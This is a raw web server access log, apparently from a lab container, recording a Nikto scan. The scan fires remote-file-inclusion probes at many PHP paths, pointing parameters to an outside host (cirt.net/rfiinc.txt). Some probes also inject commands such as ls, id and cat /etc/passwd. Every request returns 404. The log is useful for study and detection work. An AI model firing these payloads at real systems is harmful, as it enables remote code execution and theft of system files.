172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /feed/index2.php?m=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004732)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /files/amazon-bestsellers.php?CarpPath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004733)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /files/carprss.php?CarpPath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004734)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /files/compose-attach.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004735)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /files/compose-menu.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004736)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /files/compose-new.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004737)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /files/compose-send.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004738)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /files/folder-create.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004739)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /files/folder-delete.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004740)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /files/folder-empty.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004741)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /files/folder-reNikto.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004742)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /files/folder-rename.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004742)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /files/folders.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004743)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /files/login.php3?err=hack&BSX_HTXDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004744)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /files/mainfile.php?page[path]=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004745)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /files/mbox-list.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004746)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /files/message-delete.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004747)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /files/message-forward.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004748)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /files/message-header.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004749)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /files/message-print.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004750)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /files/message-read.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004751)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /files/message-reply.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004752)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /files/message-replyall.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004753)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /files/message-search.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004754)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /findix/index.php?page=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004755)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /fishcart_v3/fc_functions/fc_example.php?docroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004756)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /flushcmd/Include/editor/rich_files/class.rich.php?class_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 540 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004757)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /fonctions/template.php?repphp=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004758)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /fonctions_racine.php?chemin_lib=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004759)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /footer.inc.php?settings[footer]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004760)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /footer.inc.php?tfooter=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004761)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /footer.inc.php?tfooter=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004762)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /footer.php?footer_file=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004763)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /footer.php?op[footer_body]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004764)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /form.php?path=http://cirt.net/rfiinc.txt??&cmd=pwd HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004765)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /forum.php?cfg_file=1&fpath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004766)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /forum/forum.php?view=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004767)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /forum/forum82lib.php3?repertorylevel=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004768)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /forum/gesfil.php?repertorylevel=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004769)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /forum/lostpassword.php?repertorylevel=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004770)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /forum/mail.php?repertorylevel=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004771)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /forum/member.php?repertorylevel=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004772)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /forum/message.php?repertorylevel=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004773)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /forum/search.php?repertorylevel=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004774)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /forum/track.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004775)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /frame.php?framefile=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004776)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /ftp.php?path_local=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004777)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /function.inc.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004778)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /function.php?adminfolder=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004779)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /function.php?gbpfad=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004780)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /functions.php?include_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004781)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /functions.php?pmp_rel_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004782)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /functions.php?s[phppath]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004783)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /functions.php?set_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004784)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /functions/form.func.php?GLOBALS[PTH][classes]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004785)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /functions/general.func.php?GLOBALS[PTH][classes]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004786)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /functions/groups.func.php?GLOBALS[PTH][classes]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004787)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /functions/js.func.php?GLOBALS[PTH][classes]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004788)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /functions/prepend_adm.php?SETS[path][physical]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004789)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /functions/prepend_adm.php?SETS[path][physical]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004790)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /functions/sections.func.php?GLOBALS[PTH][classes]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004791)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /functions/users.func.php?GLOBALS[PTH][classes]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004792)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /functions_mod_user.php?phpbb_root_path=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004793)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /fusebox5.php?FUSEBOX_APPLICATION_PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004794)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /galerie.php?config[root_ordner]=http://cirt.net/rfiinc.txt??cmd=id HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004795)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /gallery/lib/content.php?include=http://cirt.net/rfiinc.txt??cmd=ls HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004797)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /gallery/theme/include_mode/template.php?galleryfilesdir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004798)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /gallerypath/index.php?includepath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004799)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /games.php?id=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004800)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /games.php?scoreid=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004801)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /gbook/includes/header.php?abspath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004802)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /gemini/page/forums/bottom.php?lang=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004803)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /gen_m3u.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004804)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /genepi.php?topdir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004805)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /generate.php?ht_pfad=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004806)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /gepi/gestion/savebackup.php?fileNikto=http://cirt.net/rfiinc.txt?&cmd=cat/etc/passwd HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004807)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /gepi/gestion/savebackup.php?filename=http://cirt.net/rfiinc.txt?&cmd=cat/etc/passwd HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004807)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /gestArt/aide.php3?aide=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004808)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /get_session_vars.php?path_to_smf=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 475 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004809)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /getpage.php?page=online&doc_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004810)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /global.php?abs_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004811)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /gorum/dbproperty.php?appDirName=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004812)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /gpb/include/db.mysql.inc.php?root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004813)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /gpb/include/db.mysql.inc.php?root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004814)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /gpb/include/gpb.inc.php?root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004815)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /gpb/include/gpb.inc.php?root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004816)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /graph.php?DOCUMENT_ROOT=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004817)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /gruppen.php?config[root_ordner]=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004818)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /handlers/email/mod.listmail.php?_PM_[path][handle]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004819)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /handlers/page/show.php?sous_rep=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004820)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /head.php?CONFIG[MWCHAT_Libs]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004821)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /header.inc.php?CssFile=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004822)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /header.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004823)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /header.php?wwwRoot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004824)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /help.php?CONFIG[MWCHAT_Libs]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004825)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /help/index.php?show=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004826)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /help_text_vars.php?cmd=dir&PGV_BASE_DIRECTORY=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004827)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /hioxBannerRotate.php?hm=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004829)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /hioxRandomAd.php?hm=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004830)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /hioxstats.php?hm=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004831)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /hioxupdate.php?hm=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004832)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /home.php?a=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004833)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /home.php?page=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004834)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /home.php?pagina=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004835)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /home/www/images/doc/index2.php?type=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004836)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /home1.php?ln=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004837)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /home2.php?ln=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004838)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /hsList.php?subdir=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004839)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /htdocs/gmapfactory/params.php?gszAppPath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004840)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /html/admin/modules/plugin_admin.php?_settings[pluginpath]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004841)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /hu/modules/reg-new/modstart.php?mod_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004842)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /i_head.php?home=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004843)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /i_nav.php?home=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004844)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /iframe.php?file=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004845)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /image.php?url=http://cirt.net/rfiinc.txt???? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004846)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /impex/ImpExData.php?systempath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004847)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /import.php?bibtexrootrel=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004848)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /importinfo.php?bibtexrootrel=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004849)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /in.php?returnpath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004850)"
